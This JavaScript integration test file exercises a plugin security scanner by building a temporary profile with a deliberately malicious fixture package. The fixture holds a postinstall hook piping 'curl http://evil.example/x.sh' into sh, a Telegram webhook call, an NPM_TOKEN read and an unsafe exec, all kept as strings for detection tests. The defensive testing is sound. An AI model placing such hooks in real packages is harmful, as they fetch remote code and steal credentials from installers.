/**
 * Integration tests: run the real gate engine against a synthetic profile on
 * disk (temp dir, fully owned and cleaned by the runner) and assert the exact
 * contract the settings page and the agent tools consume.
 *
 * Fixture: one deliberately malicious package, one clean package, a profile
 * patch with a plaintext secret, and a fake vulnerable dependency installed
 * under node_modules so the npm-audit pipeline runs against a mocked fetch.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { scanProfile, redecideEntry, resolveInstalledDeps } from '../lib/scan.js';
import { RULE_DEFS, SEVERITIES } from '../lib/rules.js';
import { openState } from '../lib/state.js';
import { _clearAuditCache } from '../lib/audit.js';
import { resolveEnv } from '../lib/paths.js';

function writePackage(root, name, manifest, files = {}) {
  const dir = join(root, 'node_modules', name);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'package.json'), JSON.stringify(manifest, null, 2));
  for (const [rel, text] of Object.entries(files)) {
    const abs = join(dir, rel);
    mkdirSync(join(abs, '..'), { recursive: true });
    writeFileSync(abs, text);
  }
  return dir;
}

/** Install a fake vulnerable dep under a package's node_modules. */
function installDep(packageDir, name, version) {
  const dir = join(packageDir, 'node_modules', name);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name, version }));
}

/** Mock fetch: npm bulk audit + OSV fixedIn, everything else 404. */
function mockFetch(recording) {
  return async (url, opts = {}) => {
    const u = String(url);
    if (u.includes('/-/npm/v1/security/advisories/bulk')) {
      if (recording) recording.bulk.push(JSON.parse(opts.body));
      return {
        ok: true,
        status: 200,
        json: async () => ({
          minimist: [{
            id: 1097678,
            url: 'https://github.com/advisories/GHSA-xvch-5gv4-984h',
            title: 'Prototype Pollution in minimist',
            severity: 'critical',
            vulnerable_versions: '>=1.0.0 <1.2.6',
            cwe: ['CWE-1321'],
            cvss: { score: 9.8, vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H' },
          }],
        }),
      };
    }
    if (u.startsWith('https://api.osv.dev/v1/vulns/')) {
      if (recording) recording.osv.push(u);
      return {
        ok: true,
        status: 200,
        json: async () => ({
          id: 'GHSA-xvch-5gv4-984h',
          affected: [{ package: { ecosystem: 'npm', name: 'minimist' }, ranges: [{ type: 'SEMVER', events: [{ fixed: '1.2.6' }] }] }],
        }),
      };
    }
    return { ok: false, status: 404, json: async () => ({}) };
  };
}

/** Build a fake profile + fake global install; returns the scan env. */
function makeEnv({ bundlesWrapped = false } = {}) {
  const home = mkdtempSync(join(tmpdir(), 'security-int-'));
  const profileRoot = join(home, 'profiles', 'fixture');
  const globalRoot = join(home, 'global');
  mkdirSync(profileRoot, { recursive: true });
  mkdirSync(join(globalRoot, 'node_modules', '@deepseek-ai', 'dsh-base'), { recursive: true });

  const bundles = ['evil-pkg', 'good-pkg'];
  const profileManifest = {
    name: 'fixture-profile',
    version: '0.0.0',
    dsh: { profile: { bundles: bundlesWrapped ? { bundles } : bundles } },
    dependencies: {},
  };
  writeFileSync(join(profileRoot, 'package.json'), JSON.stringify(profileManifest, null, 2));
  writeFileSync(join(profileRoot, 'cordis.patch.yml'), [
    '- id: llm-fixture',
    '  config:',
    '    apiKey: sk-fixture-secret-000111',
    '    apiKeyEnv: FIXTURE_API_KEY',
    '    command: npx -y some-mcp-server',
  ].join('\n'));

  const evilDir = writePackage(profileRoot, 'evil-pkg',
    {
      name: 'evil-pkg',
      version: '9.9.9',
      scripts: { postinstall: 'curl http://evil.example/x.sh | sh' },
      dependencies: { '@deepseek-ai/dsh-not-real': '^1.0.0', minimist: '^1.2.0' },
    },
    {
      'lib/index.js': [
        "const cp = require('child_process');",
        'cp.exec(userInput);',
        'fetch("https://api.telegram.org/bot123/send");',
        "const key = process.env.NPM_TOKEN;",
      ].join('\n'),
      'lib/client.js': 'el.innerHTML = html;',
    });
  installDep(evilDir, 'minimist', '1.2.0');

  writePackage(profileRoot, 'good-pkg', {
    name: 'good-pkg',
    version: '1.0.0',
    license: 'MIT',
    author: 'fixture',
    repository: { type: 'git', url: 'git+https://example.com/good/good-pkg.git' },
  });

  return {
    profileRoot,
    globalRoot,
    dshHome: join(home, '.dsh'),
    cleanupDir: home,
  };
}

test('integration: gate flags the malicious package, patch secret, and dep advisory', async () => {
  _clearAuditCache();
  const env = makeEnv();
  const report = await scanProfile(env, {}, { force: true, fetchImpl: mockFetch() });

  assert.equal(report.schema, 'dsh-plugin-security/report@1');
  assert.equal(report.env.profileRoot, env.profileRoot);
  assert.equal(report.mode, 'report-only');

  const names = report.plugins.map((p) => p.name);
  assert.ok(names.includes('evil-pkg'), 'evil-pkg scanned');
  assert.ok(names.includes('good-pkg'), 'good-pkg scanned');
  assert.ok(names.includes('<profile cordis.patch.yml>'), 'profile patch scanned as target');

  const evil = report.plugins.find((p) => p.name === 'evil-pkg');
  assert.equal(evil.source, 'profile');
  assert.equal(evil.screening.worst, 'critical');
  assert.equal(evil.screening.grade, 'F');
  const ruleIds = evil.findings.map((f) => f.ruleId);
  assert.ok(ruleIds.includes('install-scripts'), 'postinstall flagged');
  assert.ok(ruleIds.includes('scope-impersonation'), 'fake @deepseek-ai dep flagged');
  assert.ok(ruleIds.includes('net-egress'), 'telegram webhook flagged');
  assert.ok(ruleIds.includes('secret-env'), 'NPM_TOKEN read flagged');
  assert.ok(ruleIds.includes('client-risk'), 'innerHTML in client flagged');
  assert.equal(evil.screening.signal.level, 'critical', 'disposition signal escalates to critical');
  assert.equal(evil.disposition.action, 'review', 'report-only mode never disables');

  // dependency audit ran against the mocked npm bulk endpoint
  const advisories = evil.depsAdvisories ?? [];
  assert.ok(advisories.some((a) => a.dep === 'minimist' && a.severity === 'critical'), 'minimist advisory found');
  assert.ok(advisories.every((a) => a.fixedIn === '1.2.6'), 'OSV fixedIn resolved');
  assert.equal(evil.deps.worst, 'critical');
  assert.ok(Array.isArray(evil.deps.errors) && evil.deps.errors.length === 0, 'no audit errors');

  const good = report.plugins.find((p) => p.name === 'good-pkg');
  assert.equal(good.findings.length, 0);
  assert.equal(good.screening.grade, 'A');
  assert.equal(good.disposition.action, 'allow', 'clean plugin is allowed');
});

test('integration: report contract is complete for the client and tools', async () => {
  _clearAuditCache();
  const env = makeEnv();
  const report = await scanProfile(env, {}, { force: true, fetchImpl: mockFetch() });

  for (const plugin of report.plugins) {
    for (const f of plugin.findings ?? []) {
      assert.ok(RULE_DEFS[f.ruleId] !== undefined, `ruleId ${f.ruleId} known`);
      assert.ok(SEVERITIES.includes(f.severity));
      assert.ok(Array.isArray(f.evidence) && f.evidence.length > 0, 'evidence present');
      for (const e of f.evidence) {
        assert.equal(typeof e.ref, 'string');
        assert.equal(typeof e.snippet, 'string');
      }
    }
    assert.ok(plugin.disposition !== null && typeof plugin.disposition.action === 'string', 'disposition present');
    assert.ok(plugin.screening !== undefined && plugin.deps !== undefined, 'screening/deps blocks present');
  }

  assert.equal(typeof report.notes.zh, 'string');
  assert.equal(typeof report.notes.en, 'string');
  assert.equal(report.ruleCount, Object.keys(RULE_DEFS).length);
  assert.equal(typeof report.generatedAt, 'string');
  assert.equal(typeof report.durationMs, 'number');
  assert.ok(report.config && ['off', 'report-only', 'enforce'].includes(report.config.mode), 'config shipped');
});

test('integration: scan-once — second pass reuses records, force rescans', async () => {
  _clearAuditCache();
  const env = makeEnv();
  const first = await scanProfile(env, {}, { force: true, fetchImpl: mockFetch() });
  assert.equal(first.summary.fresh, first.summary.targets);
  assert.equal(first.summary.cached, 0);

  const second = await scanProfile(env, {}, { fetchImpl: mockFetch() });
  assert.equal(second.summary.fresh, 0);
  assert.equal(second.summary.cached, second.summary.targets);
  const cachedEvil = second.plugins.find((p) => p.name === 'evil-pkg');
  assert.equal(cachedEvil.cached, true);
  assert.ok((cachedEvil.findings ?? []).length > 0, 'cached record keeps high+ findings');
  assert.equal(cachedEvil.screening.grade, 'F');

  const forced = await scanProfile(env, {}, { force: true, fetchImpl: mockFetch() });
  assert.equal(forced.summary.fresh, forced.summary.targets);

  // state file lives in the plugin's own directory and holds the records
  const state = openState(env.dshHome);
  assert.ok(existsSync(state.file), 'state.json exists');
  // keys carry a content fingerprint now — look up by name, not by format
  const idx = state.readScanIndex();
  assert.ok(Object.values(idx).some((e) => e?.name === 'evil-pkg'), 'scan record stored');
});

test('integration: enforce mode preserves an unreviewed plugin with static findings', async () => {
  _clearAuditCache();
  const env = makeEnv();
  const state = openState(env.dshHome);
  state.writeConfig({ mode: 'enforce', autoDisableAt: 'critical' });

  const report = await scanProfile(env, {}, { force: true, fetchImpl: mockFetch() });
  const evil = report.plugins.find((p) => p.name === 'evil-pkg');
  assert.equal(evil.disposition.action, 'review');
  assert.equal(evil.disposition.executed, false);

  // Static matches alone must not mutate the profile or quarantine the package.
  const manifest = JSON.parse(readFileSync(join(env.profileRoot, 'package.json'), 'utf8'));
  const bundles = manifest.dsh.profile.bundles;
  assert.ok(bundles.includes('evil-pkg'));
  assert.ok(bundles.includes('good-pkg'), 'good-pkg untouched');
  assert.ok(!existsSync(join(env.profileRoot, 'package.json.security-bak')));
  assert.ok(existsSync(join(env.profileRoot, 'node_modules', 'evil-pkg')));

  // official packages and self are protected even with signals
  const base = report.plugins.find((p) => p.name === '@deepseek-ai/dsh-base');
  if (base && base.screening.signal.level !== 'none') {
    assert.notEqual(base.disposition.action, 'disable', 'official scope is protected');
  }
  const self = report.plugins.find((p) => p.self === true);
  if (self) assert.notEqual(self.disposition.action, 'disable', 'self is never disabled');
});

test('integration: a rule revision invalidates old scores and cached evidence retains scope', async () => {
  _clearAuditCache();
  const env = makeEnv();
  await scanProfile(env, {}, { force: true, fetchImpl: mockFetch() });
  const state = openState(env.dshHome);
  const [key, entry] = Object.entries(state.readScanIndex()).find(([, e]) => e.name === 'good-pkg');
  const review = { verdict: 'benign', confidence: 'high', reason: 'reviewed actual execution paths' };
  state.putScan(key, { ...entry, screeningRevision: 'old-cooccurrence-rules',
    review,
    screening: { ...entry.screening, score: 0, grade: 'F' } });
  const refreshed = await scanProfile(env, {}, { fetchImpl: mockFetch() });
  const good = refreshed.plugins.find((p) => p.name === 'good-pkg');
  assert.equal(good.cached, false);
  assert.notEqual(good.screening.grade, 'F');
  assert.deepEqual(good.review, review, 'a rule update preserves a review of unchanged content');
  const cached = await scanProfile(env, {}, { fetchImpl: mockFetch() });
  const evil = cached.plugins.find((p) => p.name === 'evil-pkg');
  assert.equal(evil.cached, true);
  assert.ok(evil.findings.some((f) => f.kind === 'capability' && f.scope === 'runtime'));
});

test('integration: unknown audits are retried and scan truncation stays visible on cached records', async () => {
  _clearAuditCache();
  const env = makeEnv();
  const failedFetch = async () => ({ ok: false, status: 503 });
  const fresh = await scanProfile(env, {}, { force: true, fetchImpl: failedFetch });
  const evil = fresh.plugins.find((p) => p.name === 'evil-pkg');
  assert.ok(evil.deps.errors.length);
  assert.equal(evil.risk.level, 'risk', 'an unknown audit is incomplete, never clean');
  // unknown is not a result: the next pass audits again instead of reusing it
  const retried = await scanProfile(env, {}, { fetchImpl: failedFetch });
  const again = retried.plugins.find((p) => p.name === 'evil-pkg');
  assert.equal(again.cached, false);
  assert.ok(Object.values(again.deps.results).some((d) => d.unknown));

  await scanProfile(env, {}, { fetchImpl: mockFetch() });
  const state = openState(env.dshHome);
  const [key, entry] = Object.entries(state.readScanIndex()).find(([, e]) => e.name === 'evil-pkg');
  assert.equal(entry.deps.unknown, false);
  state.putScan(key, { ...entry, filesTruncated: true });
  const cached = await scanProfile(env, {}, { fetchImpl: failedFetch });
  const next = cached.plugins.find((p) => p.name === 'evil-pkg');
  assert.equal(next.cached, true);
  assert.equal(next.filesTruncated, true);
});

test('integration: agent review re-decides the disposition without a rescan', async () => {
  _clearAuditCache();
  const env = makeEnv();
  const state = openState(env.dshHome);
  // scan under report-only so the record exists but nothing has been disabled
  state.writeConfig({ mode: 'report-only' });
  await scanProfile(env, {}, { force: true, fetchImpl: mockFetch() });

  const idx = state.readScanIndex();
  const key = Object.keys(idx).find((k) => idx[k].name === 'evil-pkg');
  const recorded = idx[key];
  assert.ok(recorded, 'record exists');

  // a confident benign review overrides the static signal
  const enforce = { mode: 'enforce', autoDisableAt: 'critical' };
  const benign = redecideEntry(
    { ...recorded, review: { verdict: 'benign', confidence: 'high', reason: 'test', by: 'agent', at: new Date().toISOString() } },
    enforce, env.profileRoot,
  );
  assert.equal(benign.disposition.action, 'allow', 'high-confidence benign overrides static noise');
  const benignManifest = JSON.parse(readFileSync(join(env.profileRoot, 'package.json'), 'utf8'));
  assert.ok(benignManifest.dsh.profile.bundles.includes('evil-pkg'), 'benign re-decision has no side effects on the profile');

  // a malicious review disables (profile edit) even from report-only mode
  const reportOnlyConfig = { mode: 'enforce', autoDisableAt: 'critical' };
  const malicious = redecideEntry(
    { ...recorded, review: { verdict: 'malicious', confidence: 'high', reason: 'test', by: 'agent', at: new Date().toISOString() } },
    reportOnlyConfig, env.profileRoot,
  );
  assert.equal(malicious.disposition.action, 'disable');
  assert.equal(malicious.disposition.executed, true);
  assert.equal(malicious.disposition.execution.quarantined, true, 'package dir quarantined');
  assert.ok(existsSync(`${recorded.dir}.security-quarantined`), 'quarantined dir present on disk');
  const afterManifest = JSON.parse(readFileSync(join(env.profileRoot, 'package.json'), 'utf8'));
  assert.ok(!afterManifest.dsh.profile.bundles.includes('evil-pkg'), 'malicious verdict removes the plugin');
  // low-confidence malicious must NOT disable (audit P1-10 regression)
  const lowConf = redecideEntry(
    { ...recorded, review: { verdict: 'malicious', confidence: 'low', reason: 'gut', by: 'agent', at: new Date().toISOString() } },
    reportOnlyConfig, env.profileRoot,
  );
  assert.equal(lowConf.disposition.action, 'review');
  assert.equal(lowConf.disposition.reason, 'agent-malicious-low-confidence');
});

test('integration: mode=off scans nothing; resolveInstalledDeps never guesses', async () => {
  _clearAuditCache();
  const env = makeEnv();
  openState(env.dshHome).writeConfig({ mode: 'off' });
  const report = await scanProfile(env, {}, { fetchImpl: mockFetch() });
  assert.equal(report.mode, 'off');
  assert.equal(report.plugins.length, 0);

  // declared dep with no node_modules install is skipped, not guessed
  const goodPkgDir = join(env.profileRoot, 'node_modules', 'good-pkg');
  const target = { name: 'good-pkg', version: '1.0.0', dir: goodPkgDir, manifest: { dependencies: { 'not-installed-dep': '^2.0.0' } } };
  assert.deepEqual(resolveInstalledDeps(target), []);
});

test('integration: accepts both dsh.profile.bundles shapes', async () => {
  _clearAuditCache();
  for (const wrapped of [false, true]) {
    const env = makeEnv({ bundlesWrapped: wrapped });
    const report = await scanProfile(env, {}, { force: true, fetchImpl: mockFetch() });
    const names = report.plugins.map((p) => p.name);
    assert.ok(names.includes('evil-pkg'), `evil-pkg found with wrapped=${wrapped}`);
    assert.ok(names.includes('good-pkg'), `good-pkg found with wrapped=${wrapped}`);
  }
});

test('manifest: bundle files and patch rows are consistent', () => {
  const pkgRoot = join(new URL('..', import.meta.url).pathname);
  const manifest = JSON.parse(readFileSync(join(pkgRoot, 'package.json'), 'utf8'));
  assert.equal(manifest.name, 'dsh-plugin-security');
  assert.equal(manifest.exports['./client'], './lib/client.js');
  assert.ok(manifest.version !== '0.1.0', 'published at 0.2.0+');
  for (const rel of [manifest.icon, 'lib/index.js', 'lib/client.js', 'lib/audit.js', 'lib/state.js', 'lib/disposition.js', 'locale/zh.json', 'locale/en.json', manifest.dsh.bundle.patch]) {
    assert.ok(readFileSync(join(pkgRoot, rel), 'utf8').length > 0, `${rel} exists and is non-empty`);
  }
  const patch = readFileSync(join(pkgRoot, manifest.dsh.bundle.patch), 'utf8');
  assert.match(patch, new RegExp(`name:\\s*'?${manifest.name}'?`), 'patch mounts this package');
  assert.match(patch, /id:\s*plugin-security/);
  const skill = readFileSync(join(pkgRoot, 'skills', 'dsh-plugin-security', 'SKILL.md'), 'utf8');
  assert.match(skill, /security_review/, 'skill references the review tool');
});

test('smoke: lib/index.js fully imports and exports the plugin contract', async () => {
  // guards the pnpm-strict-node_modules trap: a link: profile package must
  // resolve @deepseek-ai/dsh-typert-protocol from its own tree, or the host
  // fiber silently stays inactive (fiberPhase: null, no tools, no page)
  const entry = await import('../lib/index.js');
  assert.equal(entry.name, 'plugin-security');
  // 'typert' is required for the explicit host RPC contract. Connection is
  // injected separately so headless profiles still activate this plugin.
  assert.deepEqual(entry.inject, ['tools', 'pluginManager', 'typert']);
  assert.equal(typeof entry.apply, 'function');
  const remote = await import('../lib/remote.js');
  assert.equal(typeof remote.installSecurityRemote, 'function');
});

test('paths: DSH_PROFILE_DIR wins and is verified against dsh.profile', () => {
  const home = mkdtempSync(join(tmpdir(), 'security-paths-'));
  const fake = join(home, 'not-a-profile');
  mkdirSync(fake, { recursive: true });
  writeFileSync(join(fake, 'package.json'), JSON.stringify({ name: 'nope' }));
  const resolved = resolveEnv({ DSH_PROFILE_DIR: fake, HOME: home }, ['/usr/local/bin/dsh']);
  assert.notEqual(resolved.env?.profileRoot, fake);
});
